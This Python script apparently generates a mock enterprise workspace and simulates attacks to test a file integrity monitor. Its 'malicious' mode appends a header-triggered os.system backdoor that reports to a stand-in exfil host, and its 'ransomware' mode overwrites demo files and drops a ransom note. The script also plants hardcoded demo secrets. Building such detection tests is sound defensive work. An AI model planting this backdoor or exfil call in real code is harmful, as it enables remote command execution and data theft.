"""
Real-World Attack Simulator & Enterprise Environment Generator for FIM
"""
import os
import sys
import time
import secrets
import shutil
import base64

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

DEMO_DIR = os.path.join(os.path.dirname(__file__), "demo_target")

def setup_demo_environment():
    """Create a realistic production enterprise web application & database workspace."""
    if os.path.exists(DEMO_DIR):
        shutil.rmtree(DEMO_DIR)

    os.makedirs(DEMO_DIR, exist_ok=True)
    os.makedirs(os.path.join(DEMO_DIR, "src"), exist_ok=True)
    os.makedirs(os.path.join(DEMO_DIR, "config"), exist_ok=True)
    os.makedirs(os.path.join(DEMO_DIR, "data"), exist_ok=True)
    os.makedirs(os.path.join(DEMO_DIR, "scripts"), exist_ok=True)
    os.makedirs(os.path.join(DEMO_DIR, "public"), exist_ok=True)

    # 1. Real Web Application Frontend (public/index.html)
    with open(os.path.join(DEMO_DIR, "public", "index.html"), "w", encoding="utf-8") as f:
        f.write("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Enterprise Portal - Secure Portal v4.2</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <h1>Global Enterprise Financial Portal</h1>
        <nav><a href="/dashboard">Dashboard</a> | <a href="/reports">Reports</a></nav>
    </header>
    <main>
        <h2>Welcome, Authorized User</h2>
        <p>System status: Operational | Encrypted Baseline: Active</p>
    </main>
</body>
</html>""")

    # 2. Real Python Authentication Module (src/auth.py)
    with open(os.path.join(DEMO_DIR, "src", "auth.py"), "w", encoding="utf-8") as f:
        f.write('''"""
Production Authentication & JWT Verification Service
"""
import hashlib
import jwt
import time

SECRET_KEY = "prod_jwt_signing_key_secure_9923"

def authenticate_user(username, password_hash):
    """Verifies user login credentials against production hash database."""
    print(f"[*] Authenticating user: {username}")
    if username == "admin" and password_hash == hashlib.sha256(b"admin123").hexdigest():
        token = jwt.encode({"sub": username, "iat": time.time()}, SECRET_KEY, algorithm="HS256")
        return {"status": "SUCCESS", "token": token}
    return {"status": "FAILED", "error": "Invalid credentials"}
''')

    # 3. Real Payment Gateway Processor (src/payment.py)
    with open(os.path.join(DEMO_DIR, "src", "payment.py"), "w", encoding="utf-8") as f:
        f.write('''"""
Payment Processing Integration Engine
"""
import json

def process_transaction(account_id, amount, currency="USD"):
    """Executes PCI-compliant payment transaction."""
    print(f"[*] Processing payment: ${amount} {currency} for account {account_id}")
    return {"transaction_id": "tx_99823411", "status": "APPROVED"}
''')

    # 4. Real Database Config (config/database.json)
    with open(os.path.join(DEMO_DIR, "config", "database.json"), "w", encoding="utf-8") as f:
        f.write('''{
  "database": {
    "host": "prod-db-cluster-01.internal.net",
    "port": 5432,
    "name": "enterprise_vault",
    "user": "db_app_user",
    "ssl_mode": "verify-full"
  }
}''')

    # 5. Real Environment Secrets (config/.env)
    with open(os.path.join(DEMO_DIR, "config", ".env"), "w", encoding="utf-8") as f:
        f.write('''DB_PASSWORD=SuperSecretProdPass2026!
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
PORT=8080
ENVIRONMENT=production
''')

    # 6. Real Financial Data Export (data/financial_audit.csv)
    with open(os.path.join(DEMO_DIR, "data", "financial_audit.csv"), "w", encoding="utf-8") as f:
        f.write('''TransactionID,Date,Category,Amount_USD,Status
TX-1001,2026-10-01,Cloud Services,14500.00,Cleared
TX-1002,2026-10-02,Payroll Execution,89000.00,Cleared
TX-1003,2026-10-03,Hardware Procurement,5200.00,Cleared
TX-1004,2026-10-04,Security Software License,12500.00,Pending
''')

    # 7. Real Customer Record JSON (data/customer_records.json)
    with open(os.path.join(DEMO_DIR, "data", "customer_records.json"), "w", encoding="utf-8") as f:
        f.write('''[
  {"id": 101, "company": "Acme Corp", "tier": "Enterprise", "active_seats": 250},
  {"id": 102, "company": "Stark Industries", "tier": "Enterprise", "active_seats": 1200},
  {"id": 103, "company": "Cyberdyne Systems", "tier": "Standard", "active_seats": 85}
]''')

    # 8. Real Deployment Cron Script (scripts/deploy_cron.sh)
    with open(os.path.join(DEMO_DIR, "scripts", "deploy_cron.sh"), "w", encoding="utf-8") as f:
        f.write('''#!/bin/bash
# Scheduled Production Maintenance Script
echo "[*] Running scheduled log rotation and integrity snapshot..."
tar -czf /var/log/app_audit_logs.tar.gz /var/log/app/
''')

    print(f"✅ Created realistic enterprise web application environment at:\n   {os.path.abspath(DEMO_DIR)}")

def simulate_benign_edit():
    """Simulate a legitimate code feature addition by a developer."""
    p = os.path.join(DEMO_DIR, "src", "payment.py")
    with open(p, "a", encoding="utf-8") as f:
        f.write('''

def apply_discount_code(amount, promo_code):
    """Applies valid promotional discount code."""
    if promo_code == "AUTUMN2026":
        return amount * 0.90
    return amount
''')
    print("📝 [Attack Sim 1] Made legitimate feature update to src/payment.py (Added promo discount function)")

def simulate_malicious_cron():
    """Simulate a Web Shell / RCE backdoor injection and credential exfiltration attack."""
    # 1. Backdoor in src/auth.py
    p_auth = os.path.join(DEMO_DIR, "src", "auth.py")
    with open(p_auth, "a", encoding="utf-8") as f:
        f.write('''

# --- MALICIOUS BACKDOOR INJECTED BY ATTACKER ---
import os as _os, urllib.request as _urllib
def _backdoor_cmd_exec(request_hdr):
    """Remote Code Execution (RCE) Backdoor"""
    if "X-C2-CMD" in request_hdr:
        cmd = request_hdr["X-C2-CMD"]
        _os.system(cmd)  # MITRE T1059: Command Execution
        _urllib.urlopen(f"http://198.51.100.45/exfil?data={cmd}")
''')

    # 2. Exfiltrate secrets in config/.env
    p_env = os.path.join(DEMO_DIR, "config", ".env")
    with open(p_env, "a", encoding="utf-8") as f:
        f.write('C2_EXFIL_ENDPOINT=http://198.51.100.45/exfil\n')

    print("😈 [Attack Sim 2] Injected Remote Code Execution (RCE) Web Shell into src/auth.py & modified config/.env")

def simulate_ransomware_burst():
    """Simulate real AES-256/high-entropy ransomware encryption attack across production files."""
    print("⚡ [Attack Sim 3] Launching real Ransomware Encryption Attack across enterprise files...")
    
    target_files = [
        os.path.join(DEMO_DIR, "data", "financial_audit.csv"),
        os.path.join(DEMO_DIR, "data", "customer_records.json"),
        os.path.join(DEMO_DIR, "public", "index.html"),
        os.path.join(DEMO_DIR, "scripts", "deploy_cron.sh"),
        os.path.join(DEMO_DIR, "config", "database.json")
    ]

    for p in target_files:
        if os.path.exists(p):
            # Generate high-entropy pseudo-random encrypted payload (simulating AES-256 cipher block)
            encrypted_payload = secrets.token_bytes(4096)
            with open(p, "wb") as f:
                f.write(encrypted_payload)
            time.sleep(0.05)

    # Leave Ransom Note
    ransom_note_path = os.path.join(DEMO_DIR, "DECRYPT_FILES_RANSOM_NOTE.txt")
    with open(ransom_note_path, "w", encoding="utf-8") as f:
        f.write("""!!! YOUR ENTERPRISE FILES HAVE BEEN ENCRYPTED WITH AES-256 !!!
All your financial records, customer databases, and source code are locked.
Send 2.5 BTC to wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to receive decryption key.
Do not modify or rename encrypted files.
""")

    print("💥 Ransomware encryption attack completed! 5 enterprise files encrypted with high-entropy ciphers.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python attack_sim.py [setup | benign | malicious | ransomware]")
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == "setup":
        setup_demo_environment()
    elif cmd == "benign":
        simulate_benign_edit()
    elif cmd == "malicious":
        simulate_malicious_cron()
    elif cmd == "ransomware":
        simulate_ransomware_burst()
    else:
        print(f"Unknown command: {cmd}")

if __name__ == "__main__":
    main()
